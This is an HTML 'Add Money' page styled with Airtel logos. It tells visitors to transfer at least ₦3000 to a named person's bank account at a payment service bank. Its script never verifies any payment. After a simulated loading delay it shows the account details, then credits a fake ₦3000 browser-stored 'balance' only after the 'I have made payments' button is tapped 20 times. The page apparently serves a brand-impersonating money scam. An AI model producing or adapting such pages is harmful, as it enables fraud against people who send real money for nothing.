<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Add Money</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #fff;
      overflow: hidden;
      position: relative;
    }

    .background {
      position: fixed;
      width: 100%;
      height: 100%;
      overflow: hidden;
      z-index: -1;
    }

    .background img {
      position: absolute;
      width: 20px;
      opacity: 0.1;
      animation: float 15s linear infinite;
    }

    @keyframes float {
      from { transform: translateY(100vh) rotate(0deg); }
      to { transform: translateY(-100vh) rotate(360deg); }
    }

    .container {
      padding: 20px;
      max-width: 400px;
      margin: 60px auto 0;
      background: rgba(255, 255, 255, 0.8);
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(255,0,0,0.1);
      text-align: center;
    }

    .logo {
      width: 100px;
      margin: 0 auto 20px;
      display: block;
    }

    .input-amount {
      padding: 12px;
      font-size: 18px;
      width: 80%;
      border: 1px solid #ccc;
      border-radius: 10px;
      margin-bottom: 20px;
    }

    .btn {
      padding: 12px 20px;
      font-size: 18px;
      background: red;
      color: #fff;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    .hidden {
      display: none;
    }

    .popup {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      max-width: 300px;
      margin: 30px auto;
    }

    .loader {
      text-align: center;
      margin-top: 30px;
    }

    .loader img {
      width: 50px;
      animation: spin 1.5s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0); }
      100% { transform: rotate(360deg); }
    }

    .account-card {
      margin-top: 30px;
      background: #fff;
      border-radius: 16px;
      padding: 20px;
      text-align: center;
      box-shadow: 0 0 20px rgba(0,0,0,0.05);
    }

    .account-card h3 {
      margin-bottom: 10px;
    }

    .dashboard-btn {
      margin-top: 30px;
      text-align: center;
    }

    .dashboard-btn button {
      background: #444;
      color: white;
      padding: 10px 20px;
      border-radius: 10px;
      border: none;
      font-size: 16px;
    }

  </style>
</head>
<body>

  <div class="background" id="bg-animation"></div>

  <div class="container" id="step1">
    <img src="airtel-logo.png" class="logo" alt="Airtel Logo" />
    <input id="amount" class="input-amount" type="number" placeholder="Enter amount (min ₦3000)" />
    <button class="btn" onclick="handleContinue()">Continue</button>
  </div>

  <div class="container hidden" id="loading">
    <div class="loader">
      <img src="airtel-logo.png" alt="Loading" />
      <p>Please wait...</p>
    </div>
  </div>

  <div class="container hidden" id="accountDetails">
    <img src="airtel-logo.png" class="logo" />
    <div class="account-card">
      <h3>Transfer To:</h3>
      <p><strong>Account Name:</strong> EMMANUEL OKWUNNA</p>
      <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
      <p><strong>Account Number:</strong> 812 489 0070</p>
    </div>
    <button class="btn" onclick="confirmPayment()">I have made payments</button>
    <div class="dashboard-btn">
      <button onclick="window.location.href='dashboard.html'">← Back to Dashboard</button>
    </div>
  </div>

  <script>
    const bg = document.getElementById("bg-animation");
    for (let i = 0; i < 50; i++) {
      const img = document.createElement("img");
      img.src = "airtel-logo.png";
      img.style.left = Math.random() * 100 + "%";
      img.style.top = Math.random() * 100 + "%";
      img.style.animationDuration = (5 + Math.random() * 10) + "s";
      bg.appendChild(img);
    }

    function handleContinue() {
      const amount = parseInt(document.getElementById("amount").value);
      if (isNaN(amount) || amount < 3000) {
        alert("Please input a minimum of ₦3000");
        return;
      }

      document.getElementById("step1").classList.add("hidden");
      document.getElementById("loading").classList.remove("hidden");

      setTimeout(() => {
        document.getElementById("loading").classList.add("hidden");
        document.getElementById("accountDetails").classList.remove("hidden");
      }, 3000); // simulate loader
    }

    function confirmPayment() {
      alert("Please wait, we are confirming your transaction...");
      let taps = parseInt(localStorage.getItem("fundTaps")) || 0;
      taps += 1;

      if (taps >= 20) {
        // Fund wallet
        let currentBalance = parseInt(localStorage.getItem("balance")) || 0;
        currentBalance += 3000;
        localStorage.setItem("balance", currentBalance);
        localStorage.setItem("fundTaps", 0);
        alert("₦3,000 has been added to your wallet!");
      } else {
        localStorage.setItem("fundTaps", taps);
      }
    }
  </script>

</body>
  </html>
